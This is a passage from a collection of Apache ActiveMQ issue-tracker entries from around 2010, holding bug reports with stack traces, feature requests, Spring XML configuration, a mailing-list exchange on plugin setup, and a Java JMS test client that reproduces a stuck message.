originalTransactionId = null, producerId = ID:arctic01.csc.fi-39780-1280232016428-0:0:2:1, destination = queue://cells.domain.dCacheDomain, transactionId = null, expiration = 0, timestamp = 0, arrival = 0, brokerInTime = 1284359899636, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@6f28b428, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = null, readOnlyProperties = false, readOnlyBody = false, droppable = false} first to FilePendingMessageCursor java.lang.NullPointerException: null        at org.apache.kahadb.util.LinkedNode.isHeadNode(LinkedNode.java:64) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.util.LinkedNode.unlink(LinkedNode.java:230) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.util.SequenceSet.removeFirstSequence(SequenceSet.java:203) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.PageFile.allocate(PageFile.java:753) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:137) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:121) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.createEntry(PList.java:425) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:170) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList$2.execute(PList.java:163) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:161) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:221) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:192) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1601) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:707) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.send(Queue.java:646) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at java.lang.Thread.run(Thread.java:619) &#91;na:1.6.0_20&#93;13 Sep 2010 08:38:19 (JMS) [] Async error occurred: java.lang.RuntimeException: java.lang.NullPointerExceptionjava.lang.RuntimeException: java.lang.NullPointerException        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:228) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.addMessageLast(FilePendingMessageCursor.java:192) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.addMessageLast(StoreQueueCursor.java:96) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.sendMessage(Queue.java:1601) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:707) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.Queue.send(Queue.java:646) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:365) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:494) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:136) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) &#91;activemq-all-5.4.0.jar:5.4.0&#93;        at java.lang.Thread.run(Thread.java:619) &#91;na:1.6.0_20&#93;Caused by: java.lang.NullPointerException: null        at org.apache.kahadb.util.LinkedNode.isHeadNode(LinkedNode.java:64) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.util.LinkedNode.unlink(LinkedNode.java:230) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.util.SequenceSet.removeFirstSequence(SequenceSet.java:203) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.PageFile.allocate(PageFile.java:753) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:137) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.allocate(Transaction.java:121) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.createEntry(PList.java:425) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:170) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList$2.execute(PList.java:163) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.store.kahadb.plist.PList.addLast(PList.java:161) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.tryAddMessageLast(FilePendingMessageCursor.java:221) ~&#91;activemq-all-5.4.0.jar:5.4.0&#93;        ... 24 common frames omittedWe got a number of those exceptions with the same stack trace and then followed by tons of other NullPointerExceptions, likely because the list was corrupted at that point.Not long after these stack traces message delivery began to hang. A restart of the broker only helped temporarily as message delivery would hang again after half a minute or so. To our big suprise moving the db directory to let ActiveMQ create a new database didn"t solve the problem either. I am unable to tell to what extend that was caused by the above exceptions or not.We are happy to provide any other information you may need to debug this problem.
issueID:AMQ-2911
type:Improvement
changed files:
texts:Option to make all consumers retroactive
Our organisation uses ActiveMQ as part of our RadioVIS implementation. One feature we found that we found was missing was the ability to treat all consumers as if they were setting consumer.retroactive=true. i.e. when they connect to a topic, they are instantly sent the topic"s last message. (We found it necessary to implement server side, as the clients come from a variety of third-party providers, which do not implement the retroactive header).Included is a patch that allows this to be configured on a per-topic basis from the configuration file, for example:<policyEntry topic=">" producerFlowControl="true" alwaysRetroactive="true" memoryLimit="1mb">  <subscriptionRecoveryPolicy>     <lastImageSubscriptionRecoveryPolicy />  </subscriptionRecoveryPolicy></policyEntry>
issueID:AMQ-2912
type:Bug
changed files:
texts:Startup script does not respect JAVA_HOME environment variable.
With the latest release, if java is not in PATH, and JAVA_HOME is set to a valid jdk path, the bin/activemq script will report "ERROR: Configuration varaiable JAVA_HOME or JAVACMD is not defined correctly.".This used to work in earlier 5.x versions.
issueID:AMQ-2913
type:Improvement
changed files:
texts:Allow users to override ACTIVEMQ_DATA_DIR
This tiny patch adds support for running activemq with a custom data dir, that is in a separate location from $ACTIVEMQ_HOME.
issueID:AMQ-2914
type:Improvement
changed files:
texts:Allow users to override ACTIVEMQ_PIDFILE
This tiny patch adds support for running activemq with a custom pid file, that is in a separate location from $ACTIVEMQ_DATA_DIR.
issueID:AMQ-2915
type:Bug
changed files:
texts:Associated advisory topics aren&#39;t cleaned up when a topic/queue is deleted via AdminView
Basically when you create a queue/topic and connect either a producer or consumer to that queue/topic advisory topics are created; if you later delete the queue/topic the advisory topics aren"t cleaned up.  This could become a problem for folks that tend to create and destroy queues/topics often for whatever reason.  Patch fixes this and adds a test for topics and queues.
issueID:AMQ-2919
type:Bug
changed files:ActiveMQBytesMessage.java
texts:OutOfMemory exception possible when using ByteMessage-s due to JVM bug
Due to following  http://bugs.sun.com/view_bug.do?bug_id=4797189 the custom deflator is not closed when used with DeflaterOutputStream. A workaround is to explicitly close it.
issueID:AMQ-2922
type:New Feature
changed files:KahaDBTransactionStore.java
texts:Add ability for KahaDB log files to be created on a per-destination basis.
KahaDB persistence uses rolling log files to store unconsumed messages. These are named db-1.log, db-2.log ... db3.log. At present these files contain messages for all destinations managed by the broker.A configurable option could be added that would allow these files to be created on a per-destination basis. For example, if the broker contained two queue destinations, queue_1 and queue_2, the log files would become:queue_1-1.log, queue_1-2.log....etcqueue_2-1.log, queue_2-2.log....etcEach set of log files would only contain messages for the relevant destination. This would help in the following situation:queue_1: receives one message every 15 seconds or so. These messages remain unconsumed for several hours.queue_2: receives thousands of messages per second. These messages are consumed as they arrive.At present, the scenario above leads to each log files containing a few messages that have yet to be consumed and thousands of messages that have been consumed, but the log file cannot be deleted until all messages logged in it have been consumed (which may be hours later).Logging on a per-destination basis would allow the log files for queue_2 in the above example to be deleted, meaning the unconsumed messages on queue_1 take up far less disk space. This would also reduce the number of file handles required.
issueID:AMQ-2925
type:Improvement
changed files:PooledConnection.java
texts:PooledConnection.getConnection() should be public
PooledConnection should use public access mode for method getConnection() to make it easier to access the ActiveMQConnection. At the moment I access it via the ActiveMQSession but I think it would be more clean to access it vie PooledConnection
issueID:AMQ-2927
type:New Feature
changed files:
texts:Implement custom brokerId assignment strategy
In network of brokers, duplicate route detection is done by checking broker ids. After the restart, the broker ids change, which can cause duplicate routes and messages stuck due to reached ttl.We need to provide a mechanism for users to configure how their broker ids are assigned and make sure that they stay the same after the restart. Which will ensure correct duplicate route detection even after some of the broker in the mesh is restarted.
issueID:AMQ-2929
type:Bug
changed files:
texts:Compressed text message received by consumer uncompressed
I have a queue setup to send and consume compressed text messages.  This is done via Spring setting ActiveMQConnectionFactory.useCompression to true.  If the consumer connects to this queue before the first message is arrives, everything works great.If the messages are sent to this queue before the consumer connects, those early messages will cause ZipException "unknown compression method" when consumed by the belated consumer. Debugger shows that the ActiveMQTextMessage.content already contains the uncompressed text (with 4 leading length bytes) when ActiveMQTextMessage.getText() is called.If I set useCompression to false, early messages are consumed with no problems.  Please look into this.I notice that after ActiveMQTextMessage.getText() decompress the message, it does not set compressed to false. Not sure if that is the cause.
issueID:AMQ-2932
type:Improvement
changed files:IdGenerator.java
texts:A little optimization to IdGenerator and a potential issue with the counter
At Apache Camel we have a copy of the ActiveMQ IdGeneratorCamel generator is herehttps://svn.apache.org/repos/asf/camel/trunk/camel-core/src/main/java/org/apache/camel/impl/ActiveMQUuidGenerator.javaActiveMQ generator is herehttps://svn.apache.org/repos/asf/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/util/IdGenerator.javaDuring some work to introduce pluggable id generators in Camel I did look at the source a bit more.1) sequence counterThe sequence counter is a long primitive which uses ++ to increment. Its actually not guaranteed to be an atomic operation across all JVMs and OSs.Solution: Use a AtomicLong2) Optimize generateUuid() methodThe generator method concat strings using +I did some testing on my laptop and by using StringBuilder I could get it to be slightly faster. And I computed the max size the generated id could be so the string builder has allocated the space on start.Solution: Use StringBuilderSee the Camel source code for example.
issueID:AMQ-2935
type:Bug
changed files:JobSchedulerStore.java
PageFile.java
texts:java.io.EOFException: Chunk stream does not exist at page on broker start
I am seeing this regularly upon restarts in all versions from 5.4.x - I cannot downgrade due to breaking issues in previous versions.The broker was shutdown cleanly with no logged issues.Deleting the activemq-data directory seems to be the only recovery solution (which is not an option in production)2010-09-23 13:54:30,997 &#91;Starting ActiveMQ Broker&#93; ERROR org.apache.activemq.broker.BrokerService - Failed to start ActiveMQ JMS Message Broker. Reason: java.io.EOFException: Chunk stream does not exist at page: 0java.io.EOFException: Chunk stream does not exist at page: 0 at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:454) at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:431) at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:428) at org.apache.kahadb.page.Transaction.load(Transaction.java:404) at org.apache.kahadb.page.Transaction.load(Transaction.java:361) at org.apache.activemq.broker.scheduler.JobSchedulerStore$3.execute(JobSchedulerStore.java:250) at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) at org.apache.activemq.broker.scheduler.JobSchedulerStore.doStart(JobSchedulerStore.java:239) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53) at org.apache.activemq.broker.scheduler.SchedulerBroker.getStore(SchedulerBroker.java:198) at org.apache.activemq.broker.scheduler.SchedulerBroker.getInternalScheduler(SchedulerBroker.java:185) at org.apache.activemq.broker.scheduler.SchedulerBroker.start(SchedulerBroker.java:85) at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157) at org.apache.activemq.broker.BrokerFilter.start(BrokerFilter.java:157) at org.apache.activemq.broker.TransactionBroker.start(TransactionBroker.java:112) at org.apache.activemq.broker.BrokerService$3.start(BrokerService.java:1786) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:496) at org.apache.activemq.ra.ActiveMQResourceAdapter$1.run(ActiveMQResourceAdapter.java:85)
issueID:AMQ-2938
type:Bug
changed files:
texts:ActiveMQ Console requires Jasypt bundle which is not part of the ActiveMQ features
ActiveMQ Console OSGi bundle now requires org.jasypt.encryption.pbe package (defined in import package statement).Unfortunately the ActiveMQ feature doesn"t provide the jasypt bundle.So, when you install and start ActiveMQ feature, you get:java.lang.Exception: Could not start bundle mvn:org.apache.activemq/activemq-console/5.4.1 in feature(s) : Unresolved constraint in bundle org.apache.activemq.activemq-console &#91;44&#93;: Unable to resolve 44.0: missing requirement &#91;44.0&#93; package; (package=org.jasypt.encryption.pbe) - &#91;44.0&#93; package; (package=org.jasypt.encryption.pbe)I"m gonna submit a patch to provide a clean ActiveMQ feature.
issueID:AMQ-2939
type:Bug
changed files:
texts:Disable Spring 3 schema validation
With Activemq 5.3.2, I had this in my activemq.xml:<beans xmlns="http://www.springframework.org/schema/beans" xmlns:amq="http://activemq.apache.org/schema/core"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="    http://activemq.apache.org/schema/core        http://activemq.apache.org/schema/core/activemq-core-5.4.1.xsd    http://camel.apache.org/schema/spring    http://camel.apache.org/schema/spring/camel-spring.xsd    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd "><bean id="myPlugin" class="com.yahoo.MyPlugin"> <property name="disabled">  <value>false</value> </property></bean><broker xmlns="http://activemq.apache.org/schema/core" brokerName="broker1" dataDirectory="${activemq.base}/data" plugins="#myPlugin"> <transportConnectors>  <transportConnector name="openwire" uri="tcp://0.0.0.0:61616" /> </transportConnectors></broker></beans>Relevant email thread.----Original Message----From: chubrilo@gmail.com chubrilo@gmail.com On Behalf Of Dejan BosanacSent: Thursday, September 23, 2010 4:19 AMTo: users@activemq.apache.orgSubject: Re: configuring plugins with activemq 5.4.1Hi Allen,can you raise an issue for this, as it is an obvious regression? It"s probably due the fact that in 5.4 we"re back to autogenerating schema.Cheers&#8211;Dejan Bosanac - http://twitter.com/dejanbOpen Source Integration - http://fusesource.com/ ActiveMQ in Action - http://www.manning.com/snyder/ Blog - http://www.nighttale.netOn Wed, Sep 22, 2010 at 10:58 PM, Allen Reese <areese@yahoo-inc.com> wrote:> The problem is plugins as an attribute of broker seems to be removed in the 5.4.1 xsd.>> I want to configure the plugin once outside of the brokers, the reason is, I use an <import resource="brokers.xml">, and want to allow other people to reuse the plugin configuration without having to have it as part of their broker definition.>> I guess I"ll keep playing around as I have some other ideas of how to do this, but I"m still confused if I setup my own xsd with an element for the plugin, how do I tie that to the plugin bean?>> --Allen>>> ----Original Message----> From: Stan Lewis slewis@fusesource.com> Sent: Wednesday, September 22, 2010 3:10 PM> To: users@activemq.apache.org> Subject: Re: configuring plugins with activemq 5.4.1>> Should be able to do something like:>> <plugins>>   <bean xmlns="http://www.springframework.org/schema/beans"> id="myPlugin" class="com.yahoo.MyPlugin">>        <property name="disabled">>                <value>false</value>>        </property>>   </bean>> </plugins>>> for this, there"s some other examples here:>> http://activemq.apache.org/developing-plugins.html#DevelopingPlugins-C> onfiguringpluginswithoutcustomXML>> On Wed, Sep 22, 2010 at 3:48 PM, Allen Reese <areese@yahoo-inc.com> wrote:>> With Activemq 5.3.2, I had this in my activemq.xml:>>>> <beans xmlns="http://www.springframework.org/schema/beans">>        xmlns:amq="http://activemq.apache.org/schema/core">>        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">>        xsi:schemaLocation=">>    http://activemq.apache.org/schema/core>>        http://activemq.apache.org/schema/core/activemq-core-5.4.1.xsd>>    http://camel.apache.org/schema/spring>>    http://camel.apache.org/schema/spring/camel-spring.xsd>>    http://www.springframework.org/schema/beans>>>> http://www.springframework.org/schema/beans/spring-beans-2.0.xsd>>        ">>>>> <bean id="myPlugin" class="com.yahoo.MyPlugin">>>        <property name="disabled">>>                <value>false</value>>>        </property>>> </bean>>>>> <broker xmlns="http://activemq.apache.org/schema/core">>        brokerName="broker1" dataDirectory="${activemq.base}/data">> plugins="#myPlugin">>>        <transportConnectors>>>                <transportConnector name="openwire">> uri="tcp://0.0.0.0:61616" />>>        </transportConnectors>>> </broker>>> </beans>>>>> However, when I upgrade to 5.4.1, this no longer works as plugins is no longer supported as an attribute of the broker element.>>>> I"m not really certain how to wire in a custom plugin any more, can anyone provide some information on how to do this with the 5.4.1 schema?>>>> Here was my first shot at it, but I know I"m missing how to tie the bean to the namespace.>>>> <beans xmlns="http://www.springframework.org/schema/beans">>        xmlns:amq="http://activemq.apache.org/schema/core">>        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">>        xsi:schemaLocation=">>    http://activemq.apache.org/schema/core>>        http://activemq.apache.org/schema/core/activemq-core-5.4.1.xsd>>    http://camel.apache.org/schema/spring>>    http://camel.apache.org/schema/spring/camel-spring.xsd>>    http://www.springframework.org/schema/beans>>        http://www.springframework.org/schema/beans/spring-beans-2.0.xsd">>      >>>>> <bean id="myPlugin" class="com.yahoo.MyPlugin">>>        <property name="disabled">>>                <value>false</value>>>        </property>>> </bean>>>>>        <broker xmlns="http://activemq.apache.org/schema/core">>                brokerName="broker1">> dataDirectory="${activemq.base}/data">>>        <plugins><myPlugin>> xmlns="http://yahoo.com/schema/java"/></plugins>>>                <transportConnectors>>>                        <transportConnector name="stomp">> uri="tcp://0.0.0.0:61616" />>>                </transportConnectors>>>        </broker>>> </beans>>>>> Thanks.>>>> --Allen Reese>
issueID:AMQ-2941
type:New Feature
changed files:
texts:Add a non-JMX way to browse and delete scheduled/delayed messages
Currently, the only way to deal with existing scheduled/delayed messages is to use JMX against the JobSchedulerView mbean. This has several drawbacks: It requires another connection to the broker. It does not participate in HA failover (e.g. master/slave). Browsing requires to parse the TabularData and CompositeData objects returned by the remote mbean. The mbean doesn"t stream data. This means that for instance in a queue with hundreds of thousands of scheduled messages, hitting the getAllJobs mbean operation could kill the broker because of memory problems.Instead it would be nice to have something like a queue browser (which that can browse the whole queue, see AMQ-2172) for scheduled/delayed messages that can be created with for instance from a session object. Ideally it would also provide support for message selectors to make it easy to get and delete scheduled messages (see AMQ-2940).
issueID:AMQ-2942
type:Bug
changed files:HttpsTransportFactory.java
texts:Can&#39;t configure an inactivity monitor for https transport
Well, you can however the configuration isn"t applied.  This patch sorts that out.  Note that I couldn"t automate a test for this as I had to manually kill off one of the brokers to get the behavior to manifest itself, as described here.
issueID:AMQ-2948
type:Bug
changed files:
texts:Support ajax clients in multiple windows/tabs in a single browser
In current ajax code, there is a 1-1 relationship between ajax client and session.  Since multiple windows in the same browser share the same session, it"s impossible for the ajax code to update both windows.  Either 1 or the other will receive messages, but not both.The attached patch allows an optional "clientId" string to be passed to the JavaScript amq.init() function, similar to that supported by the REST servlet.  This clientId string is sent to the server with every ajax request.  In MessageListenerServlet, a new consumer is created for every new sessionid+clientId, allowing multiple windows in the same browser to send & receive messages independently.For some (currently) unknown reason, IE7 cannot send messages from multiple windows.  2 IE7 windows can receive messages independently with no errors, but once either IE7 window sends a message, both windows cease receiving data.  This behavior is not seen in FF (OSX or WinXP) or Safari (OSX).  All those browsers are able to send & receive simultaneously in multiple windows with no errors.
issueID:AMQ-2950
type:Bug
changed files:
texts:XA transactions not rolled back when on connection close
We should roll them back the same way we do for local transactions
issueID:AMQ-2952
type:Bug
changed files:
texts:Message groups with small prefetch
Closing and starting message groups with a lot of consumers and a small prefetch could result in messages being dispatched to wrong consumers. The problem is that message group logic is done before we detecting weather the consumer is full or not.
issueID:AMQ-2954
type:Bug
changed files:
texts:NPE in JobSchedulerStore after restarts
The scenario is the following:1) I schedule 1K messages with 1 hour delay2) I restart the broker3) Each time I try to schedule a message I get the following error: Caused by: java.lang.NullPointerException at org.apache.activemq.broker.scheduler.JobSchedulerStore$1.execute(JobSchedulerStore.java:196) at org.apache.kahadb.page.Transaction.execute(Transaction.java:728) at org.apache.activemq.broker.scheduler.JobSchedulerStore.getJobScheduler(JobSchedulerStore.java:192) at org.apache.activemq.broker.scheduler.SchedulerBroker.getInternalScheduler(SchedulerBroker.java:184) at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:131) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:230) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:460) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:663) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:309) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:218) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) ... 1 more
issueID:AMQ-2955
type:Bug
changed files:MessageDatabase.java
texts:Message getting stuck on queue, leading to KahaDB log files not being deleted and disk running out of space
Using the following test client, we see a single message getting stuck on the queue. This then prevents the KahaDB files from being cleaned up. Once this message gets stuck, we need to restart the broker before it can be consumed. This is a total show stopper for us, as when this occurs in our system the large number of messages that we produce and consume each second causes the disk to run out of space within the space of an hour. We also see the same behaviour using synchronous sending and without failover.This doesn"t happen every time with the test client - the most reliable way I have found to reproduce it is to start the broker and wait for the first MessageDatabase checkpoint to finish before starting the test client. Test Clientimport java.io.BufferedWriter;import java.io.FileWriter;import java.util.Random;import javax.jms.Connection;import javax.jms.Message;import javax.jms.MessageConsumer;import javax.jms.MessageListener;import javax.jms.MessageProducer;import javax.jms.Queue;import javax.jms.Session;import javax.jms.ConnectionFactory;import org.apache.activemq.ActiveMQConnectionFactory;public class Test {        public static final void main(String[] args) throws Exception {                ConnectionFactory cf = new ActiveMQConnectionFactory("failover:(tcp://localhost:61616)?jms.useAsyncSend=true&trackMessages=true");                final Connection producerConn = cf.createConnection();                final Connection consumerConn = cf.createConnection();                final BufferedWriter producerLog = new BufferedWriter(new FileWriter("produced.log"));                final BufferedWriter consumerLog = new BufferedWriter(new FileWriter("consumed.log"));                new Thread(new Runnable() {                        public void run() {                                try {                                        producerConn.start();                                        Session session = producerConn.createSession(false, Session.CLIENT_ACKNOWLEDGE);                                        Queue queue = session.createQueue("TEST_QUEUE");                                        MessageProducer producer = session.createProducer(queue);                                        Random random = new Random();                                        byte[] messageBytes = new byte[1024];                                        for (int i = 0; i < 100000; i++) {                                        //while (true) {                                                random.nextBytes(messageBytes);                                                Message message = session.createObjectMessage(messageBytes);                                                producer.send(message);                                                producerLog.write(message.getJMSMessageID());                                                producerLog.newLine();                                                producerLog.flush();                                        }                                        System.out.println("Produced 100000 messages...");                                        producerLog.close();                                }                                catch (Exception e) {                                        e.printStackTrace();                                }                        }                }).start();                System.out.println("Started producer...");                new Thread(new Runnable() {                        public void run() {                                try {                                        consumerConn.start();                                        Session session = consumerConn.createSession(false, Session.CLIENT_ACKNOWLEDGE);                                        Queue queue = session.createQueue("TEST_QUEUE");                                        MessageConsumer consumer = session.createConsumer(queue);                                        consumer.setMessageListener(new MessageListener() {                                                public void onMessage(Message message) {                                                        try {                                                                message.acknowledge();                                                                consumerLog.write(message.getJMSMessageID());                                                                consumerLog.newLine();                                                                consumerLog.flush();                                                        }                                                        catch (Exception e) {                                                                e.printStackTrace();                                                        }                                                }                                        });                                }                                catch (Exception e) {                                        e.printStackTrace();                                }                        }                }).start();                System.out.println("Started consumer...");        }}After the 100,000 messages have been produced, we can see the following difference in the log files:[pblackburn@xxxx test]$ diff produced.log consumed.log10394d10393< 